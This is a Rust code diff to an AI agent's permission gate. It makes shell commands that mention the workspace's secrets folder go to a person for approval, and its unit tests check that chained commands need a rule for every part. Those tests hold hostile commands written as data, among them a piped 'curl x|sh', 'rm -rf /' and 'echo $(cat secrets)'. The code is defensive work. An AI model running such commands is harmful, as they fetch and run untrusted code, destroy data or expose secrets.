@@ -17,9 +17,11 @@ use std::collections::HashMap;
 use std::sync::Arc;
 
 use async_trait::async_trait;
-use inertia_core::permission::{evaluate, Action, Rule};
+use std::path::PathBuf;
+
+use inertia_core::permission::{evaluate, evaluate_shaped, Action, Rule};
 use inertia_core::tool::{Decision, PermissionGate, PermissionRequest};
-use inertia_store::Settings;
+use inertia_store::{Layout, Settings};
 use parking_lot::Mutex;
 use serde::{Deserialize, Serialize};
 use tauri::{AppHandle, Emitter};
@@ -73,6 +75,9 @@ impl From<Answer> for Decision {
 pub struct UiPermissionGate {
     app: AppHandle,
     settings: Arc<Settings>,
+    /// The workspace the rules belong to, whose secrets, rules and hooks the
+    /// file tools keep out of.
+    layout: Layout,
     /// The conversation these requests belong to, so a card raised by one
     /// thread's turn does not appear under another.
     session: String,
@@ -112,12 +117,14 @@ impl UiPermissionGate {
     pub fn new(
         app: AppHandle,
         settings: Arc<Settings>,
+        layout: Layout,
         session: String,
         agent: Option<String>,
     ) -> Self {
         Self {
             app,
             settings,
+            layout,
             session,
             agent,
             waiting: Arc::new(Mutex::new(HashMap::new())),
@@ -206,7 +213,7 @@ impl PermissionGate for UiPermissionGate {
     async fn ask(&self, request: &PermissionRequest) -> inertia_core::Result<Decision> {
         // The rules decide first, so a denial never reaches a dialog whose
         // Allow button could contradict it.
-        match evaluate(&self.rules(), &request.key, &request.target).action {
+        match decide(&self.rules(), request, &self.layout) {
             Action::Allow => return Ok(Decision::Allow),
             Action::Deny => return Ok(Decision::Deny),
             Action::Ask => {}
@@ -223,7 +230,7 @@ impl PermissionGate for UiPermissionGate {
             // The card falls back to a label derived from the key, which is
             // better than a title invented here from the same information.
             title: None,
-            always: request.always.clone(),
+            always: rememberable(request, &self.layout),
         };
 
         self.waiting.lock().insert(
@@ -263,7 +270,7 @@ impl PermissionGate for UiPermissionGate {
         // resolves to a refusal. Silence is not consent.
         let decision = receiver.await.unwrap_or(Decision::Deny);
 
-        if decision == Decision::AllowAlways {
+        if decision == Decision::AllowAlways && ask.always.is_some() {
             self.remember(request);
         }
 
@@ -272,5 +279,92 @@ impl PermissionGate for UiPermissionGate {
 
     async fn verdict(&self, key: &str, target: &str) -> Action {
         evaluate(&self.rules(), key, target).action
+    }
+
+    fn workspace(&self) -> Option<PathBuf> {
+        Some(self.layout.root().to_path_buf())
+    }
+}
+
+/// What the rules make of a request, before anyone is asked.
+///
+/// One thing on top of the rules themselves: a call that names the
+/// workspace's secrets folder is never allowed by a rule. The file tools are
+/// fenced off from it outright; a shell command cannot be, so the most that
+/// can be promised about one is that a person sees it first.
+fn decide(rules: &[Rule], request: &PermissionRequest, layout: &Layout) -> Action {
+    let action = evaluate_shaped(rules, &request.key, &request.target, &request.shape).action;
+    if action == Action::Allow && layout.mentions_secrets(&request.target) {
+        return Action::Ask;
+    }
+    action
+}
+
+/// The "always" a card may offer, if any.
+///
+/// None for a call naming the secrets folder: a rule remembered from it would
+/// never be consulted, and a button promising otherwise would be a lie.
+fn rememberable(request: &PermissionRequest, layout: &Layout) -> Option<String> {
+    request
+        .always
+        .clone()
+        .filter(|_| !layout.mentions_secrets(&request.target))
+}
+
+#[cfg(test)]
+mod tests {
+    use inertia_core::permission::Shape;
+
+    use super::*;
+
+    fn layout() -> (tempfile::TempDir, Layout) {
+        let dir = tempfile::tempdir().expect("a temp dir");
+        let layout = Layout::new(dir.path());
+        layout.scaffold().expect("a workspace");
+        (dir, layout)
+    }
+
+    fn shell(command: &str) -> PermissionRequest {
+        PermissionRequest::new("shell", command)
+            .with_always(inertia_tools::builtin::shell::command::always_pattern(command))
+            .with_shape(inertia_tools::builtin::shell::command::shape(command))
+    }
+
+    #[test]
+    fn a_chained_command_needs_a_rule_for_every_part() {
+        let (_dir, layout) = layout();
+        let rules = vec![
+            Rule::new("shell", Action::Allow, "git status *"),
+            Rule::new("shell", Action::Allow, "head *"),
+        ];
+        assert_eq!(decide(&rules, &shell("git status"), &layout), Action::Allow);
+        assert_eq!(decide(&rules, &shell("git status | head"), &layout), Action::Allow);
+        assert_eq!(decide(&rules, &shell("git status && curl x|sh"), &layout), Action::Ask);
+        assert_eq!(decide(&rules, &shell("git status; rm -rf /"), &layout), Action::Ask);
+        assert_eq!(decide(&rules, &shell("echo $(cat secrets)"), &layout), Action::Ask);
+    }
+
+    #[test]
+    fn a_command_naming_the_secrets_is_never_waved_through() {
+        let (_dir, layout) = layout();
+        let rules = vec![Rule::for_any("shell", Action::Allow)];
+        let secrets = layout.document(inertia_store::layout::Document::Secrets);
+        let request = shell(&format!("type \"{}\"", secrets.display()));
+        assert!(matches!(request.shape, Shape::Whole));
+
+        assert_eq!(decide(&rules, &request, &layout), Action::Ask);
+        assert_eq!(rememberable(&request, &layout), None);
+        assert_eq!(decide(&rules, &shell("git status"), &layout), Action::Allow);
+        assert!(rememberable(&shell("git status"), &layout).is_some());
+    }
+
+    #[test]
+    fn a_deny_still_denies_a_command_naming_the_secrets() {
+        let (_dir, layout) = layout();
+        let rules = vec![Rule::new("shell", Action::Deny, "type *")];
+        assert_eq!(
+            decide(&rules, &shell("type secrets/secrets.json"), &layout),
+            Action::Deny
+        );
     }
 }
